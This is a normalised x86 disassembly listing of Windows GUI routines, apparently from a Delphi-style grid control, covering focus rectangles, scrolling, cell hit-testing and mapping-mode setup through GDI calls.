mov eax [ edi + 0x38 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x70 ]
push eax
mov al [ r-xdata ]
push eax
mov eax [ ebx ]
mov ecx [ edi + 0x4 ]
sub ecx [ eax + 0x288 ]
mov eax [ ebx ]
mov edx [ eax + 0x25c ]
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
call sub_45c3d4
pop ecx
mov eax [ ebx ]
test [ eax + 0x1c ] 0x10
jne r-xdata
or [ ebp - 0x84 ] 0x8
or [ ebp - 0x88 ] 0x2
mov eax [ edi + 0x8 ]
cmp eax [ edi + 0xc ]
jge r-xdata
mov eax [ ebx ]
test [ eax + 0x249 ] 0x10
je r-xdata
mov eax [ edi + 0x38 ]
cmp eax [ edi + 0x3c ]
jge r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41cd48
mov eax [ edi + 0x38 ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
xor edx edx
mov eax [ edi + 0x8 ]
call sub_412484
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d120
mov eax [ ebx ]
cmp [ eax + 0x28c ] 0x0
je r-xdata
mov eax [ ebx ]
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x70 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x14 ]
call sub_41cd48
mov eax [ edi + 0x3c ]
push eax
lea eax [ ebp - 0xc8 ]
push eax
mov ecx [ edi + 0xc ]
mov edx [ edi + 0x38 ]
xor eax eax
call sub_412484
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d120
mov eax [ ebx ]
mov si 0xffb5
call sub_403324
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
mov eax [ ebx ]
call sub_45d234
push 0x0
lea edx [ ebp - 0xc8 ]
mov eax [ ebx ]
call sub_45fdfc
lea edx [ ebp - 0xc8 ]
lea ecx [ ebp - 0xb8 ]
mov eax [ ebx ]
call sub_45db70
mov eax [ ebx ]
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
push edi
lea esi [ ebp - 0xb8 ]
lea edi [ ebp - 0xa8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov eax [ ebp - 0xb0 ]
mov [ ebp - 0xa8 ] eax
mov eax [ ebp - 0xb8 ]
mov [ ebp - 0xa0 ] eax
lea eax [ ebp - 0xa8 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d4a0
push eax
call DrawFocusRect
lea edx [ ebp - 0xb8 ]
mov eax [ ebx ]
mov eax [ eax + 0x208 ]
call sub_41d0ec
jmp r-xdata
sub_45cc04
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov esi [ ebx + 0x4 ]
cmp esi [ ebp - 0x4 ]
jle r-xdata
mov eax [ ebx + 0x1c ]
mov edx [ ebx + 0x20 ]
dec edx
mov [ ebp - 0xc ] esi
xor eax eax
mov edx [ ebx + 0x18 ]
dec edx
xor ecx ecx
mov [ ebp - 0xc ] ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x8 ] 0xffffffff
mov esi eax
sub edx esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_45cc6c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4345b8
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov esi [ ebx + 0x1c ]
mov edi [ ebx + 0x20 ]
dec edi
mov [ ebp - 0xc ] eax
xor esi esi
mov edi [ ebx + 0x18 ]
dec edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4345b8
mov [ ebp - 0xc ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc edi
mov [ ebp - 0x10 ] edi
mov [ ebp - 0x8 ] 0xffffffff
sub edi esi
jl r-xdata
inc esi
dec [ ebp - 0x10 ]
jne r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0xc ]
jge r-xdata
sub_45ccec
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov edi [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
push ebp
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_45cc6c
pop ecx
mov [ edi ] eax
mov eax ebx
mov edx [ ebp - 0x8 ]
call sub_45cc04
mov [ edi ] eax
jmp r-xdata
lea eax [ ebx + 0x30 ]
mov edx [ ebp - 0xc ]
call sub_45cc04
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45cd48
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4345fc
push eax
mov eax ebx
call sub_4345b8
mov ecx eax
mov edx esi
mov eax ebx
call sub_45cdcc
pop esi
pop ebx
retn
sub_45cd6c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov [ ebx + 0xc ] edx
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax [ ebx + 0x1c ]
mov [ ebx + 0x10 ] eax
mov esi [ ebx + 0x1c ]
mov eax [ ebx + 0x20 ]
dec eax
sub eax esi
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
inc eax
mov [ ebp - 0x4 ] eax
mov [ ebx + 0x10 ] esi
mov eax [ ebx + 0x8 ]
mov [ ebx + 0x14 ] eax
inc esi
dec [ ebp - 0x4 ]
jne r-xdata
mov [ ebx + 0x8 ] eax
jmp r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
add eax [ ebx ]
add [ ebx + 0x8 ] eax
mov eax [ ebx + 0xc ]
mov edx eax
add edx [ ebx ]
cmp edx [ ebx + 0x8 ]
jge r-xdata
sub_45cdcc
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx edx
mov edx ebx
call sub_45ce88
mov eax ebx
mov edx esi
call sub_45cd6c
lea eax [ ebx + 0x30 ]
mov edx [ ebp + 0x8 ]
call sub_45cd6c
pop esi
pop ebx
pop ebp
retn 0x4
sub_45cdf8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x2 ] dx
mov ebx eax
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov ax [ eax + 0x248 ]
and ax [ ebp - 0x2 ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov eax [ ebp + 0x18 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x244 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov [ ebx + 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebx + 0x1c ] eax
mov eax [ ebp + 0x10 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x28 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x2c ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
inc esi
xor edi edi
xor eax eax
mov [ ebx + 0x4 ] eax
mov esi [ ebp - 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
add eax [ ebx ]
add [ ebx + 0x4 ] eax
inc edi
dec esi
jne r-xdata
sub_45ce88
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_45fdbc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x238 ]
mov eax ebx
mov dx [ r-xdata ]
call sub_45cdf8
pop ecx
push ebp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
push sub_45fddc
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x23c ]
lea eax [ ebx + 0x30 ]
mov dx [ r-xdata ]
call sub_45cdf8
pop ecx
pop ebx
pop ecx
pop ebp
retn
sub_45cf0c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0xc ]
add eax [ ebx ]
mov [ ebp - 0xc ] eax
mov esi [ ebp - 0x4 ]
mov eax [ ebx + 0x18 ]
sub eax esi
jg r-xdata
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
dec eax
mov [ ebp - 0x10 ] eax
dec esi
inc [ ebp - 0x10 ]
jne r-xdata
sub [ ebp - 0xc ] eax
mov eax [ ebx ]
sub [ ebp - 0xc ] eax
mov eax [ ebx + 0x4 ]
cmp eax [ ebp - 0xc ]
jle r-xdata
mov edx esi
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jle r-xdata
mov [ ebp - 0x8 ] esi
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
test eax eax
jg r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
sub_45cf80
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi [ ebp + 0x8 ]
mov edx [ ebx ]
mov eax esi
call sub_45cf0c
mov [ edi ] eax
mov edx [ ebx + 0x4 ]
lea eax [ esi + 0x30 ]
call sub_45cf0c
mov [ edi + 0x4 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_45cfb0
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x5 ] cl
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ ebp - 0x5 ] 0x3
jne r-xdata
mov ebx [ edi + 0x4 ]
mov eax [ edi ]
mov [ ebp - 0x14 ] eax
xor edx edx
mov [ ebp - 0x10 ] edx
cmp [ ebp - 0x14 ] 0x7
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov eax [ edi + 0x1c ]
mov edx [ edi + 0x20 ]
dec edx
sub edx eax
jl r-xdata
mov [ ebp - 0x14 ] 0x7
mov edx [ ebp - 0x14 ]
sub edx eax
shr edx 0x1
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4345b8
sub eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ edi + 0xc ]
cmp eax [ edi + 0x8 ]
jne r-xdata
inc edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xc ] eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx eax
sub edx [ ebp - 0x10 ]
cmp edx [ ebp - 0x4 ]
jg r-xdata
mov eax ebx
sub eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x4 ]
jg r-xdata
cmp eax [ ebp - 0x4 ]
jl r-xdata
add ebx [ edi ]
inc [ ebp - 0xc ]
dec [ ebp - 0x18 ]
jne r-xdata
add eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ edi + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x10 ]
mov [ edx ] eax
mov eax [ edi + 0xc ]
sub eax [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
mov [ edx ] eax
mov eax [ edi + 0x10 ]
inc eax
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x14 ]
mov [ edx ] eax
mov edx [ ebp - 0xc ]
mov eax [ edi + 0x2c ]
call [ edi + 0x28 ]
add ebx eax
cmp ebx [ edi + 0x8 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x18 ]
mov dl [ ebp - 0x5 ]
mov [ eax ] dl
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
mov [ eax ] ebx
sub ebx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov [ eax ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov [ eax ] edx
jmp r-xdata
sub_45d0c8
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4345b8
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setg al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setg al
pop esi
pop ebp
retn
sub_45d114
push ebp
mov ebp esp
push esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov si 0xffc8
call sub_403324
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_4345b8
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
sub eax [ edx + 0x4 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x8 ]
setge al
pop esi
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp eax [ edx + 0x4 ]
setge al
pop esi
pop ebp
retn
sub_45d160
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov esi ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x18 ]
mov [ eax ] 0x0
mov eax [ ebp + 0x14 ]
mov [ eax ] 0xffffffff
mov eax [ ebp - 0x4 ]
mov bx [ eax + 0x248 ]
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov eax ebx
and ax [ r-xdata ]
mov dx [ r-xdata ]
cmp dx ax
je r-xdata
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x290 ]
or ax bx
mov ebx eax
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x14
mov eax [ ebp - 0x4 ]
call sub_4345fc
mov edx [ ebp + 0x8 ]
mov [ edx + 0x3c ] eax
mov eax [ ebp - 0x4 ]
call sub_4345b8
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
push ebp
call sub_45d0c8
pop ecx
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jle r-xdata
test bl 0x80
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
cmp esi [ eax + 0x34 ]
jge r-xdata
push ebp
call sub_45d114
pop ecx
test al al
jne r-xdata
push ebp
mov eax [ ebp + 0x8 ]
mov cl 0x3
mov edx [ ebp - 0x8 ]
call sub_45cfb0
pop ecx
jmp r-xdata
push ebp
mov eax [ ebp + 0x8 ]
add eax 0x30
mov cl 0x2
mov edx esi
call sub_45cfb0
pop ecx
sub_45d234
push ebx
add esp 0xfffffff0
mov ebx eax
test dl dl
je r-xdata
mov ecx esp
xor edx edx
xor eax eax
call sub_41245c
lea ecx [ esp + 0x8 ]
mov edx 0x1
mov eax 0x1
call sub_41245c
push 0x8
mov eax [ ebx + 0x208 ]
call sub_41d4a0
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41d4a0
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_4345fc
push eax
mov eax ebx
call sub_4345b8
push eax
mov eax [ ebx + 0x208 ]
call sub_41d4a0
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_4345fc
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_4345b8
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41d4a0
push eax
call SetWindowExtEx
mov eax ebx
call sub_4345b8
mov ecx esp
xor edx edx
call sub_41245c
lea ecx [ esp + 0x8 ]
mov edx 0x1
or eax 0xffffffff
call sub_41245c
push 0x8
mov eax [ ebx + 0x208 ]
call sub_41d4a0
push eax
call SetMapMode
push 0x0
mov eax [ esp + 0x8 ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41d4a0
push eax
call SetWindowOrgEx
push 0x0
mov eax ebx
call sub_4345fc
push eax
mov eax ebx
call sub_4345b8
push eax
mov eax [ ebx + 0x208 ]
call sub_41d4a0
push eax
call SetViewportExtEx
push 0x0
mov eax ebx
call sub_4345fc
imul [ esp + 0x10 ]
push eax
mov eax ebx
call sub_4345b8
imul [ esp + 0x10 ]
push eax
mov eax [ ebx + 0x208 ]
call sub_41d4a0
push eax
call SetWindowExtEx
jmp r-xdata
add esp 0x10
pop ebx
retn
sub_45d388
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x10 ]
mov eax [ eax + 0x10 ]
call sub_4233b0
mov ebx eax
lea eax [ ebp - 0x14 ]
push eax
mov ecx esi
and ecx ebx
mov edx esi
not edx
and edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_45bb74
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x48 ]
mov [ ebp - 0xc ] eax
push 0x0
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_43b390
push eax
call InvalidateRect
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d3f4
push ebp
mov ebp esp
add esp 0xffffff98
push ebx
push esi
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov eax [ ebx ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x224 ] 0x0
je r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x230 ]
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x220
call sub_45acb4
mov eax [ ebx ]
cmp [ eax + 0x250 ] 0x0
je r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x21c ]
mov eax [ ebx ]
add eax 0x224
mov ecx 0x1
call sub_45acb4
mov eax [ ebx ]
mov edx [ eax + 0x228 ]
mov [ ebp - 0x8 ] edx
mov edx [ eax + 0x22c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x24c ]
mov edx [ ebx ]
cmp eax [ edx + 0x22c ]
jg r-xdata
mov eax [ ebx ]
mov ecx [ eax + 0x234 ]
mov eax [ ebx ]
mov edx [ eax + 0x24c ]
mov eax [ ebx ]
add eax 0x250
call sub_45acb4
mov eax [ ebx ]
mov eax [ eax + 0x21c ]
mov edx [ ebx ]
cmp eax [ edx + 0x228 ]
jg r-xdata
dec eax
mov [ ebp - 0x4 ] eax
mov edx [ ebx ]
mov edx [ edx + 0x228 ]
mov eax [ ebp - 0x8 ]
cmp edx eax
jne r-xdata
dec eax
mov [ ebp - 0x8 ] eax
push 0x1
push 0x1
mov edx [ ebx ]
mov ecx [ ebp - 0x4 ]
xchg edx eax
call sub_45e3b4
mov edx [ ebx ]
mov edx [ edx + 0x22c ]
cmp edx [ ebp - 0x4 ]
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx ]
call sub_45e32c
mov eax [ ebx ]
mov eax [ eax + 0x214 ]
cmp eax [ ebp - 0x4 ]
je r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x210 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
mov eax [ ebx ]
call sub_45dce4
jmp r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x258 ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x4c ]
jne r-xdata
mov eax [ ebx ]
cmp [ eax + 0x292 ] 0x0
jne r-xdata
mov eax [ ebx ]
call sub_45ecf4
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x70 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x6c ]
mov eax [ ebx ]
mov si 0xffa8
call sub_403324
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebx ]
mov eax [ eax + 0x25c ]
mov edx [ ebp + 0x8 ]
cmp eax [ edx - 0x1c ]
je r-xdata
mov eax [ ebx ]
call sub_43b694
test al al
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx ]
call sub_45cd48
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x68 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffff98
xor ecx ecx
call sub_45d388
pop ecx
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0x38 ]
mov eax [ ebp + 0x8 ]
add eax 0xffffffc8
or ecx 0xffffffff
call sub_45d388
pop ecx
sub_45d59c
push ebp
mov ebp esp
add esp 0xffffff90
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43b694
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov [ ebp - 0x6c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x24c ]
mov [ ebp - 0x70 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x21c ] ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24c ] esi
mov eax [ ebp - 0x4 ]
cmp ebx [ eax + 0x238 ]
jge r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebp - 0x4 ]
call sub_45cd48
mov eax [ ebp - 0x4 ]
cmp esi [ eax + 0x23c ]
jge r-xdata
dec ebx
mov eax [ ebp - 0x4 ]
mov [ eax + 0x238 ] ebx
xor eax eax
push ebp
push sub_45d636
push [ fs : eax ]
mov [ fs : eax ] esp
push ebp
call sub_45d3f4
pop ecx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
dec esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0x23c ] esi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45d674
push ebx
push esi
add esp 0xffffff90
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b694
test al al
je r-xdata
add esp 0x70
pop esi
pop ebx
retn
lea edx [ esp + 0x10 ]
mov eax ebx
call sub_45cd48
mov eax [ esi ]
cmp eax [ esp + 0x20 ]
jg r-xdata
mov eax [ ebx + 0x258 ]
mov [ esp + 0x8 ] eax
mov eax [ ebx + 0x25c ]
mov [ esp + 0xc ] eax
push esp
lea ecx [ esp + 0x14 ]
mov edx esi
mov eax ebx
call sub_45cf80
mov eax ebx
mov edx [ eax ]
call [ edx + 0x88 ]
mov eax [ esi ]
cmp eax [ ebx + 0x258 ]
jge r-xdata
mov edx [ esi + 0x4 ]
cmp edx [ esp + 0x50 ]
jg r-xdata
cmp eax [ esp + 0x20 ]
jle r-xdata
mov [ ebx + 0x258 ] eax
jmp r-xdata
cmp eax [ ebx + 0x258 ]
jl r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
mov eax [ esp ]
mov [ ebx + 0x258 ] eax
mov eax [ esi + 0x4 ]
cmp eax [ ebx + 0x25c ]
jge r-xdata
cmp eax [ esp + 0x50 ]
jle r-xdata
mov [ ebx + 0x25c ] eax
jmp r-xdata
lea edx [ esp + 0x8 ]
mov eax ebx
call sub_45e848
mov eax [ esp + 0x4 ]
mov [ ebx + 0x25c ] eax
sub_45d73c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c8b4
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45d86e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x208 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0x2
call sub_41cb44
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov dl 0xe
call sub_41cb28
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x10 ]
mov edx 0x1
call sub_41cb74
xor eax eax
push ebp
push sub_45d851
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebx + 0x28e ] 0x2
jne r-xdata
mov edx [ ebx + 0x264 ]
xor ecx ecx
mov eax [ ebp - 0x8 ]
call sub_41d1bc
mov ecx [ edi + 0x38 ]
mov edx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_41d15c
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
je r-xdata
mov ecx [ ebx + 0x264 ]
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_41d1bc
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0x8 ]
mov eax [ ebp - 0x8 ]
call sub_41d15c
jmp r-xdata
mov ecx [ ebx + 0x264 ]
mov edx [ edi + 0xc ]
mov eax [ ebp - 0x8 ]
call sub_41d1bc
mov edx [ edi + 0xc ]
sub edx [ edi + 0x8 ]
mov ecx [ ebx + 0x264 ]
mov eax [ ebp - 0x8 ]
call sub_41d15c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45d858
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41d3ac
retn
sub_45d87c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41c8b4
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45d9fd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor eax eax
push ebp
push sub_45d9e0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov dl 0x2
call sub_41cb44
mov eax [ ebx + 0x10 ]
mov dl 0xe
call sub_41cb28
mov eax [ ebx + 0x10 ]
mov edx 0x5
call sub_41cb74
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x28e ] 0x4
jne r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x270 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_45bb74
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_45bb74
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x26c ]
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffc8
call sub_403324
